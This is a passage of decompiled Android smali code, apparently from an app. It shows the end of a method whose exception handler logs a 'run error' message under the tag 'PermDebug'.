    return-void
    :catch_0
    move-exception v0
    new-instance v1, Ljava/lang/StringBuilder;
    const-string v2, "run error "
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
    invoke-virtual {v0}, Ljava/lang/Throwable;->toString()Ljava/lang/String;
    move-result-object v0
    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v0
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v0
    const-string v1, "PermDebug"
    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    return-void
.end method
